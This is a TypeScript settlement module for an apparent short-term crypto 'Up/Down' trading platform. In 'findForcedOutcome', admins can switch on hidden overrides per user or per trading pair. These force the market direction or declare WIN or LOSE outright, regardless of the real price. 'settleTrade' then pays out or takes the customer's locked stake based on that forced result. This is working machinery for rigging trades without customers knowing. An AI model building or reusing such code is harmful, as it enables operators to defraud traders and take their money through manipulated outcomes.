import { pool, withTransaction } from './db';
import { deductLocked, creditAvailable, unlockFunds } from './ledger';
import { resolvePrice } from './priceResolver';
import { redisPub, CHANNELS } from './redis';

type ForcedOutcome = 'BULL' | 'BEAR' | 'WIN' | 'LOSE';

/**
 * Looks up the most specific active admin outcome override for a (user, pair) pair:
 * user+pair > user-only > pair-only > none.
 *
 * BULL/BEAR force the *market direction* — the trade still wins or loses based on
 * whether the user's own Up/Down pick matches that direction. WIN/LOSE force the
 * *settlement result* directly, bypassing the direction check entirely: whatever the
 * user picked, they win (or lose) every time this override is active.
 */
async function findForcedOutcome(userId: string, pair: string): Promise<ForcedOutcome | null> {
  const res = await pool.query(
    `SELECT forced_outcome, user_id, pair FROM trade_outcome_overrides
     WHERE is_active = true AND (user_id = $1 OR user_id IS NULL) AND (pair = $2 OR pair IS NULL)
     ORDER BY (user_id IS NOT NULL)::int + (pair IS NOT NULL)::int DESC
     LIMIT 1`,
    [userId, pair]
  );
  return res.rows[0]?.forced_outcome ?? null;
}

async function settleTrade(tradeId: string) {
  await withTransaction(async (client) => {
    const res = await client.query(`SELECT * FROM short_term_trades WHERE id = $1 FOR UPDATE`, [tradeId]);
    const trade = res.rows[0];
    if (!trade || trade.outcome !== 'PENDING') return;

    const resolved = await resolvePrice(trade.pair);
    const settlementPrice = resolved ? resolved.price : parseFloat(trade.entry_price);
    const entryPrice = parseFloat(trade.entry_price);

    const forced = await findForcedOutcome(trade.user_id, trade.pair);

    let outcome: 'WIN' | 'LOSE' | 'PUSH';
    if (forced === 'WIN' || forced === 'LOSE') {
      outcome = forced;
    } else {
      let marketDirection: 'BULL' | 'BEAR' | 'FLAT';
      if (forced === 'BULL' || forced === 'BEAR') {
        marketDirection = forced;
      } else if (settlementPrice > entryPrice) {
        marketDirection = 'BULL';
      } else if (settlementPrice < entryPrice) {
        marketDirection = 'BEAR';
      } else {
        marketDirection = 'FLAT';
      }

      if (marketDirection === 'FLAT') {
        outcome = 'PUSH';
      } else {
        const won = (trade.direction === 'UP' && marketDirection === 'BULL') || (trade.direction === 'DOWN' && marketDirection === 'BEAR');
        outcome = won ? 'WIN' : 'LOSE';
      }
    }

    let payoutAmount = 0;
    if (outcome === 'PUSH') {
      await unlockFunds(client, trade.user_id, trade.stake_asset, parseFloat(trade.stake_amount));
    } else if (outcome === 'WIN') {
      payoutAmount = parseFloat(trade.stake_amount) * parseFloat(trade.payout_multiplier);
      await deductLocked(client, trade.user_id, trade.stake_asset, parseFloat(trade.stake_amount));
      await creditAvailable(client, trade.user_id, trade.stake_asset, payoutAmount);
    } else {
      await deductLocked(client, trade.user_id, trade.stake_asset, parseFloat(trade.stake_amount));
    }

    await client.query(
      `UPDATE short_term_trades
       SET outcome = $2, settlement_price = $3, payout_amount = $4, settled_at = now()
       WHERE id = $1`,
      [tradeId, outcome, settlementPrice, payoutAmount]
    );

    await redisPub.publish(
      CHANNELS.TRADE_EVENTS,
      JSON.stringify({ tradeId, userId: trade.user_id, pair: trade.pair, outcome, settlementPrice, payoutAmount })
    );

    console.log(`[matching-engine] settled short-term trade ${tradeId} (${trade.pair} ${trade.direction}) -> ${outcome}`);
  });
}

/** Polls for trades whose expiry has passed and settles them one at a time. */
export async function settleDueTrades() {
  const due = await pool.query(
    `SELECT id FROM short_term_trades WHERE outcome = 'PENDING' AND expiry_at <= now() ORDER BY expiry_at ASC LIMIT 100`
  );
  for (const row of due.rows) {
    try {
      await settleTrade(row.id);
    } catch (err) {
      console.error(`[matching-engine] failed to settle trade ${row.id}`, err);
    }
  }
}
